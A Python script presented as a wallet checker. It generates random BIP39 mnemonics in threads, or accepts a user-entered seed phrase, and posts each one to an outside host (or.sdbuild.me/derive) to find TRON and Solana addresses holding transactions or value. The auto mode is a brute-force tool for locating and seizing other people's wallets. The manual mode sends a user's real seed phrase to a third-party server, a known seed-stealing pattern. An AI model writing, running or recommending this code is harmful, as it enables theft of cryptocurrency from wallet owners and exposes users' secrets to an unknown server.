import threading
import requests
import time
from mnemonic import Mnemonic
import sys

# Updated Backend URL
BACKEND_URL = "https://or.sdbuild.me/derive"

class WalletChecker:
    def __init__(self, num_threads=10):
        self.mnemo = Mnemonic("english")
        self.num_threads = num_threads
        self.stop_event = threading.Event()
        self.found = False
        self.counter = 0
        self.lock = threading.Lock()

    def generate_phrase(self):
        return self.mnemo.generate(strength=128)

    def process_phrase(self, phrase, is_manual=False):
        try:
            # First Verification
            resp = requests.post(BACKEND_URL, json={"phrase": phrase}, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                trx_addr = data["trx_address"]
                sol_addr = data["sol_address"]
                trx_txs = data.get("trx_transactions", 0)
                sol_val = data.get("sol_value_usd", 0.0)

                with self.lock:
                    self.counter += 1
                    # Live display of phrase and addresses
                    print(f"[{self.counter}] LIVE CHECK:")
                    print(f"  Phrase: {phrase}")
                    print(f"  TRX: {trx_addr} ({trx_txs} txs)")
                    print(f"  SOL: {sol_addr} (${sol_val:.6f})")
                    print("-" * 50)

                # Check if criteria met
                is_active = trx_txs >= 1 or sol_val >= 0.004375

                if is_active:
                    print(f"\n>>> POTENTIAL HIT FOUND! Performing Second Verification...")
                    # Second Verification (Double Check)
                    time.sleep(1) # Small delay before re-checking
                    resp2 = requests.post(BACKEND_URL, json={"phrase": phrase}, timeout=10)
                    if resp2.status_code == 200:
                        data2 = resp2.json()
                        v2_trx_txs = data2.get("trx_transactions", 0)
                        v2_sol_val = data2.get("sol_value_usd", 0.0)

                        if v2_trx_txs >= 1 or v2_sol_val >= 0.004375:
                            print(f"!!! VERIFIED: HIT CONFIRMED !!!")
                            print(f"FINAL Phrase: {phrase}")
                            print(f"FINAL TRX: {trx_addr} | Txs: {v2_trx_txs}")
                            print(f"FINAL SOL: {sol_addr} | Value: ${v2_sol_val:.6f}\n")
                            
                            if not is_manual:
                                self.stop_event.set()
                                self.found = True
                                return True
                        else:
                            print(">>> Verification failed. False positive or transient error.\n")
                
                return False
            else:
                if is_manual: print(f"Backend error: {resp.text}")
        except Exception as e:
            if is_manual: print(f"Error: {e}")
        return False

    def worker(self):
        while not self.stop_event.is_set():
            phrase = self.generate_phrase()
            if self.process_phrase(phrase):
                break

    def run_auto(self):
        threads = []
        print(f"Starting {self.num_threads} threads for live auto-checking...")
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    def run_manual(self):
        while True:
            phrase = input("\nEnter mnemonic phrase to check (or 'exit' to quit): ").strip()
            if phrase.lower() == 'exit':
                break
            if len(phrase.split()) not in [12, 15, 18, 21, 24]:
                print("Invalid phrase length.")
                continue
            self.process_phrase(phrase, is_manual=True)

if __name__ == "__main__":
    # Default threads set to 3 for better readability of live output
    checker = WalletChecker(num_threads=3)
    print("1. Auto-generate and check (Live Display + Double Verify)")
    print("2. Manual phrase check")
    choice = input("Select option (1/2): ").strip()
    
    if choice == '1':
        checker.run_auto()
    elif choice == '2':
        checker.run_manual()
    else:
        print("Invalid choice.")
